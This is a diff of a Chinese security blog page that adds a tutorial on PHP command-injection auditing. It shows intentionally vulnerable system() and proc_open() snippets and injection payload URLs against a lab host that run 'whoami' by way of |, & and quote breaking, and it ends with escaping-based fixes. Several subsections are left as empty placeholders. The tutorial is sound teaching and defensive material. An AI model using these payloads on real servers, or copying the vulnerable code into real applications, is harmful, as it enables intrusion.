@@ -501,14 +501,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    157
+                    916
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -559,7 +559,187 @@
 <span class="token comment" spellcheck="true">// 反引号引起的命令执行，无回显</span>
 <span class="token keyword">echo</span> `<span class="token variable">$input</span>`<span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">;</span></code></pre>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/RCE/CommandExp/CodeAudit/常用命令执行函数操作结果.png" alt="常用命令执行函数操作结果"></center>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="system-函数（1）"><a href="#system-函数（1）" class="headerlink" title="system()函数（1）"></a><code>system()</code>函数（1）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"$arg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下所示。</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php?cmd=whoami</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+win<span class="token operator">-</span>s8n7jod9nsr\<span class="token package">administrator</span> </code></pre>
+</li>
+<li><p>代码运行原理如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/RCE/CommandExp/CodeAudit/system命令执行1.png" alt="system命令执行1"></center>
+
+
+
+</li>
+</ol>
+<h2 id="system-函数（2）"><a href="#system-函数（2）" class="headerlink" title="system()函数（2）"></a><code>system()</code>函数（2）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// ping 命令参数</span>
+<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ping $arg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php?cmd=x | whoami</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+win<span class="token operator">-</span>s8n7jod9nsr\<span class="token package">administrator</span> </code></pre>
+</li>
+<li><p>代码运行原理如下所示。</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span> <span class="token keyword">:</span> 若两边都可执行<span class="token punctuation">(</span>命令可被解析<span class="token punctuation">)</span>，则只回显右边<span class="token punctuation">;</span>
+    若左边表达式不可执行，则右边表达式也不能执行<span class="token punctuation">;</span>
+<span class="token operator">||</span><span class="token keyword">:</span> 若两边都可执行<span class="token punctuation">(</span>命令可被解析<span class="token punctuation">)</span>，则只回显左边<span class="token punctuation">;</span>
+    若左边表达式不可执行，则尝试执行右边表达式<span class="token punctuation">;</span>
+<span class="token operator">&amp;</span> <span class="token keyword">:</span> 若两边都可执行<span class="token punctuation">(</span>命令可被解析<span class="token punctuation">)</span>，则两边都执行<span class="token punctuation">;</span>
+    若左边表达式不可执行，则尝试执行右边表达式<span class="token punctuation">;</span>
+<span class="token operator">&amp;&amp;</span><span class="token keyword">:</span> 若两边都可执行<span class="token punctuation">(</span>命令可被解析<span class="token punctuation">)</span>，则两边都执行<span class="token punctuation">;</span>
+    若左边表达式不可执行，则右边表达式也不能执行<span class="token punctuation">;</span>
+    若左边表达式可执行，右边表达式不可执行，则只执行左边表达式</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/RCE/CommandExp/CodeAudit/system命令执行2.png" alt="system命令执行2"></center>
+
+
+
+</li>
+</ol>
+<h2 id="system-函数（3）"><a href="#system-函数（3）" class="headerlink" title="system()函数（3）"></a><code>system()</code>函数（3）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// dir命令</span>
+<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dir \"$arg\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php?cmd= " | whoami %26 </span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php?cmd=" %26 whoami %26 </span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+win<span class="token operator">-</span>s8n7jod9nsr\<span class="token package">administrator</span> 
+<span class="token operator">--</span>注：
+    dir <span class="token string">""</span> <span class="token punctuation">:</span> 打印当前目录
+    dir <span class="token string">" "</span><span class="token punctuation">:</span> 打印当前目录中名称为<span class="token string">' '</span>的文件夹</code></pre>
+</li>
+<li><p>代码运行原理分析。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/RCE/CommandExp/CodeAudit/system命令执行3.png" alt="system命令执行3"></center>
+
+</li>
+</ol>
+<h2 id="system-函数（4）"><a href="#system-函数（4）" class="headerlink" title="system()函数（4）"></a><code>system()</code>函数（4）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// $str = "echo '$arg' > 1.txt";</span>
+    <span class="token comment" spellcheck="true">// system($str);</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo '$arg' > 1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php?cmd=' | whoami || '</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+win<span class="token operator">-</span>s8n7jod9nsr\<span class="token package">administrator</span> </code></pre>
+</li>
+<li><p>代码运行原理分析。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/RCE/CommandExp/CodeAudit/system命令执行4.png" alt="system命令执行4"></center>
+
+
+
+</li>
+</ol>
+<h2 id="proc-open-函数"><a href="#proc-open-函数" class="headerlink" title="proc_open()函数"></a><code>proc_open()</code>函数</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// proc_open()</span>
+<span class="token variable">$des</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token comment" spellcheck="true">//r</span>
+    <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"pipe"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 标准输入，子进程从此管道中读取数据</span>
+    <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"pipe"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 标准输出，子进程向此管道中写入数据</span>
+    <span class="token number">2</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">,</span> <span class="token string">"./error-output.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 标准错误，写入到一个文件</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$des</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//var_dump($pipes);</span>
+<span class="token comment" spellcheck="true">//die();</span>
+<span class="token keyword">echo</span> <span class="token function">stream_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.10.10.138/test.php?1=whoami</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+win<span class="token operator">-</span>s8n7jod9nsr\<span class="token package">administrator</span> </code></pre>
+</li>
+<li><p>代码运行原理分析。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/RCE/CommandExp/CodeAudit/proc_open命令执行.png" alt="proc_open命令执行"></center>
+
+
+
+
+
+</li>
+</ol>
+<h2 id="system-函数（4）-1"><a href="#system-函数（4）-1" class="headerlink" title="system()函数（4）"></a><code>system()</code>函数（4）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+</li>
+<li><p>代码运行原理分析。</p>
+</li>
+</ol>
+<h2 id="system-函数（4）-2"><a href="#system-函数（4）-2" class="headerlink" title="system()函数（4）"></a><code>system()</code>函数（4）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+</li>
+<li><p>代码运行原理分析。</p>
+</li>
+</ol>
+<h2 id="system-函数（4）-3"><a href="#system-函数（4）-3" class="headerlink" title="system()函数（4）"></a><code>system()</code>函数（4）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+</li>
+<li><p>代码运行原理分析。</p>
+</li>
+</ol>
+<h2 id="system-函数（4）-4"><a href="#system-函数（4）-4" class="headerlink" title="system()函数（4）"></a><code>system()</code>函数（4）</h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php"></code></pre>
+</li>
+<li><p>代码运行原理分析。</p>
+</li>
+</ol>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// escapeshellcmd():对特殊字符进行转义(^)</span>
+<span class="token comment" spellcheck="true">// 极特殊情况下才可绕过</span>
+<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ping $arg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true">// escapeshellarg():对参数添加单引号</span>
+<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string">"ping '$arg'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1>
                 
             </div>
             <hr/>
@@ -1139,7 +1319,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">296.8k</span>&nbsp;字
+                class="white-color">297.7k</span>&nbsp;字
             
             
             
